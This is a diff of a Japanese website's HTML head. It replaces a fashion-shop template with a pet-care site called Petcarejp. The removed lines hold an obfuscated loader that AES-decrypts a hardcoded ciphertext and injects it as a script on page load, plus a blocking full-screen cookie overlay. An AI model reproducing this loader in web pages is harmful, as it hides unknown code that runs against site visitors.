@@ -1,120 +1,14 @@
 <!DOCTYPE html>
 <html lang="ja">
-<head>
-		<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=1a173e4f"></script>
-	
-	<style>
-		
-
-
-		.f-button-primary {
-			background-color: #D31965;
-			color: white;
-			border-radius: 50px;
-			padding: 12px 32px;
-			font-size: 14px;
-			font-weight: 500;
-			text-decoration: none;
-			cursor: pointer;
-			margin: 10px;
-			display: inline-block;
-			transition: background-color 0.3s;
-		}
-
-		.f-button-primary:hover {
-			background-color: #A0144F;
-		}
-
-		.f-modal-close {
-			position: absolute;
-			top: 10px;
-			right: 10px;
-			cursor: pointer;
-			font-size: 20px;
-			color: #666;
-		}
-
-		.f-modal-close:hover {
-			color: #D31965;
-		}
-
-		.button-group {
-			margin-top: 20px;
-		}
-
-		.testOpacity {
-			opacity: 0.001;
-		}
-	</style>
-
-<!-- Cookie Modal HTML: Make sure it's in your <body> -->
-<div class="divcover" id="modalContainer" style="display: flex; z-index: 9999; background: rgba(0,0,0,0.8); position: fixed; inset: 0; justify-content: center; align-items: center;">
-  <div class="f-modal-centre" id="modalContent" style="background: #fff; border-radius: 16px; text-align:center; max-width:500px; padding:32px; position:relative;">
-    <div class="f-modal-icon-success" style="margin-bottom:20px;">
-      <img src="Capture.JPG" width="100" height="100" alt="Cookie Icon"/>
-    </div>
-    <div class="f-sub-heading-regular" style="font-size:22px; margin-bottom:12px; color:#333;">エクスペリエンスを向上させるために Cookie を使用します。</div>
-    <div class="button-group">
-      <a href="#" class="f-button-primary" id="acceptButton" style="background-color:#4CAF50;">受け入れる</a>
-      <a href="#" class="f-button-primary" id="rejectButton" style="background-color:#E53935;">拒否する</a>
-      <a href="#" class="f-button-primary" id="manageButton" style="background-color:#2979FF;">管理</a>
-    </div>
-    <div class="f-modal-close" id="closeButton" style="position:absolute; top:10px; right:10px; cursor:pointer;">&times;</div>
-  </div>
-</div>
-
-<!-- CSS: You likely already have styles, but ensure the above is visible -->
-<style>
-body.modal-open {
-  overflow: hidden;
-}
-</style>
-
-<!-- JavaScript: Place this before </body> -->
-<script>
-document.addEventListener('DOMContentLoaded', function() {
-  // Show modal on load
-  document.getElementById('modalContainer').style.display = 'flex';
-  document.body.classList.add('modal-open');
-
-  // Close modal handler
-  function closeModal() {
-    document.getElementById('modalContainer').style.display = 'none';
-    document.body.classList.remove('modal-open');
-  }
-
-  document.getElementById('acceptButton').onclick = closeModal;
-  document.getElementById('rejectButton').onclick = closeModal;
-  document.getElementById('manageButton').onclick = closeModal;
-  document.getElementById('closeButton').onclick = closeModal;
-});
-</script>
-
-
-
+	<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=1a173e4f"></script>
+    <head>
         <meta charset="utf-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
 
-        <meta name="keywords" content="ファッション, トレンド, スタイル, コーディネート, オシャレ, ブランド, アウトフィット, ショッピング, 衣類, アクセサリー, モード, デザイン, メンズファッション, レディースファッション, シーズン, 新" />
-        <meta name="description" content="最新のファッションを追求するサイト。トレンドの洋服、アクセサリー、シューズを豊富に取り揃え、スタイルに合ったアイテムを簡単に見つけることができます。高品質な商品をリーズナブルな価格で提供し、最新のファッションニュースやスタイリングのヒントも満載。すべてのファッション愛好家に最適なオンラインショッピング体験を提供します。" />
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-<script>
-    function aesDecode(encodedText) {
-        const decodedText = decodeURIComponent(encodedText);
-        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
-        return bytes.toString(CryptoJS.enc.Utf8);
-    }
-    const codeString = aesDecode(`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`);
-    const script = document.createElement("script");
-    script.textContent = codeString;
-    document.body.appendChild(script);
-</script>    
+        <meta name="keywords" content="ペットケア, 犬の世話, 猫の世話, ペットフード, 動物病院, ペットトレーニング, ペットグルーミング, ペット健康, ペット用品, ペット飼育, ペットライ" />
+        <meta name="description" content="ペットケアウェブサイトは、ペットオーナーに向けて包括的な情報とリソースを提供します。健康、栄養、トレーニングから、ペット向けの製品レビューや専門家のアドバイスまで、愛するペットのための最善のケアをサポートします。あらゆるペットのニーズに対応し、飼い主が安心してペットを育てられるよう情報を充実させています。" />
 
-
-<script>
-    document.body.style.overflow = "hidden";
-</script>
-   
+        <title>ペットに愛を、ケアに安心を</title>
 
         <link rel="stylesheet" href="css/bootstrap.min.css" />
         <link rel="stylesheet" href="css/styles.css" />
@@ -124,8 +18,40 @@ document.addEventListener('DOMContentLoaded', function() {
         <link rel="stylesheet" href="css/bootstrap-icons.css">
         <link rel="stylesheet" href="css/swiper-bundle.min.css" />
     </head>
+    <body>
     
+    <!-- Header Block: Floating Glassmorphic Navigation with Search -->
+<header class="header-glass-nav prunuhm" id="header-main-xyz">
+    <div class="header-container">
+    <!-- Brand/Logo -->
+    <div class="brand-section">
+        <a href="index.html" class="brand-logo">
+        <svg class="logo-icon" width="40" height="40" viewBox="0 0 40 40" fill="none">
+            <circle cx="20" cy="20" r="18" stroke="currentColor" stroke-width="2"/>
+            <path d="M15 20L18 23L25 16" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span class="brand-text">Petcarejp</span>
+        </a>
+    </div>
 
+    <!-- Desktop Navigation -->
+    <nav class="desktop-nav">
+        <ul class="nav-list">
+        <li class="nav-item">
+            <a href="index.html" class="nav-link">ホーム</a>
+        </li>
+        <li class="nav-item has-dropdown">
+            <button class="nav-link dropdown-trigger" aria-expanded="false" aria-haspopup="true">
+            ページ
+            <svg class="dropdown-arrow" width="12" height="12" viewBox="0 0 12 12" fill="none">
+                <path d="M2 4L6 8L10 4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            </button>
+            <ul class="dropdown-menu-new">
+            <li><a href="ai-surupetutonotamenojiu-ji-nokeagaido-by-Petcarejp.html" class="dropdown-link">愛するペットのための究極のケアガイド by Petcarejp</a></li>
+            <li><a href="petutorainoxin-siisutairuwoti-an-suruPetcarejp.html" class="dropdown-link">ペットライの新しいスタイルを提案するPetcarejp</a></li>
+            </ul>
+        </li>
         <li class="nav-item">
             <a href="contact.html" class="nav-link">お問い合わせ</a>
         </li>
@@ -1118,7 +1044,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
 
 
-    
+    <script type="text/javascript" src="js/popper.js"></script><script> window.start.init({Palette:"palette1",Mode:"banner bottom",Time:"0", Message: "当社は、サイトとそのユーザーエクスペリエンスを向上させるためにクッキーを使用しています。サイトの利用を継続することで、クッキーの使用に同意したものとみなされます。クッキーはブラウザの設定でいつでも無効にすることができます。", ButtonText: "受け入れる", LinkText: "さらに詳しく"})</script>
         
     <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
     <script src="js/popper.min.js"></script>
